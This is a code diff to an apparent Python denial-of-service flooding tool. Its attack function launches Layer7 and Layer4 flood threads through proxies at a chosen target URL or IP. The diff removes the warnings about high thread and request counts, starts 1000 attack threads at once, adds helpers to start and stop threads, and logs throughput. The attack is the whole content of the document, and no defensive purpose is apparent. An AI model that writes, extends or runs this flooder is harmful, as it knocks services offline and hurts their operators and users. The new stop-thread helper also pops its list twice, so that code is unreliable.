@@ -55,7 +55,7 @@ def exit(*message):
 
 
 def attack(
-    attack_method: str,
+    attack_method: str,  # TODO: add option to use multiple attack methods
     target_address: str,  # URL or IP
     target_port: int,
     proxy_type: ProxyType = ProxyType.SOCKS5,
@@ -63,8 +63,6 @@ def attack(
     user_agents_file_path: str = "user_agents.txt",
     referrers_file_path: str = "referrers.txt"
 ):
-    attack_threads: List[Thread] = []
-
     # LOAD CONFIG FILES
     user_agents = read_configuration_file_lines(user_agents_file_path)
     referrers = read_configuration_file_lines(referrers_file_path)
@@ -119,10 +117,11 @@ def attack(
         if len(argv) == 9:
             logger.setLevel("DEBUG")
 
-        if threads > 1000:
-            logger.warning("Number of threads is higher than 1000")
-        if rpc > 100:
-            logger.warning("RPC (Requests Per Connection) number is higher than 100")
+        # TODO: no need no more in worrying about threads count
+        # if threads > 1000:
+        #     logger.warning("Number of threads is higher than 1000")
+        # if rpc > 100:
+        #     logger.warning("RPC (Requests Per Connection) number is higher than 100")
 
         # TODO: manage threads actively
         for _ in range(threads):
@@ -184,21 +183,48 @@ def attack(
                 else:
                     logger.setLevel("DEBUG")
 
+        # TODO: manage threads actively
         for _ in range(threads):
             Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
     
     # TODO: input parameters
     # TODO: launch a lot of threads according to the given methods
-    # TODO: loop:
-    #       - check CPU utilization
-    #       - decrease/increase threads
-    #       - each thread gets it's own proxy?
     logger.info(f"Attack started at {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
     event.set()
     ts = time()
 
+    # PREPARE FOR THREAD MANAGEMENT
+    thread_stop_events: List[Event] = []
+
+    def start_new_attack_thread():
+        stop_event = Event()
+        stop_event.clear()
+        thread_stop_events.append(stop_event)
+        # TODO: select random attack method from the list (when there will be multiple)
+        if attack_method in Methods.LAYER7_METHODS:
+            Layer7(url, host, attack_method, rpc, stop_event, user_agents, referrers, proxies, BYTES_SENT, REQUESTS_SENT).start()
+        elif attack_method in Methods.LAYER4_METHODS:
+            Layer4((host, port), referrers, attack_method, stop_event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+
+    def stop_attack_thread():
+        if len(thread_stop_events) == 0:
+            return
+
+        thread_to_stop = thread_stop_events.pop()
+        thread_to_stop_event = thread_stop_events.pop()
+        thread_to_stop_event.set()
+
+    INITIAL_THREADS_COUNT = 1000
+    STEP = 100
+
+    for _ in range(INITIAL_THREADS_COUNT):
+        start_new_attack_thread()
+
     while True:
-        # log_attack_status()
+        # TODO:
+        #       - check CPU utilization
+        #       - decrease/increase threads
+        #       - push attack status into the queue
 
         # update request counts
         TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
@@ -211,12 +237,9 @@ def attack(
         bps = Tools.humanbytes(int(BYTES_SENT))
         tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
         tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
-        logger.info(f"Total bytes sent: {tb}, total requests: {tp}")
+        logger.info(f"Total bytes sent: {tb}, total requests: {tp}, BPS: {bps}, PPS: {pps}")
 
         sleep(1)
-
-    event.clear()
-    exit()
 
 
 def start():
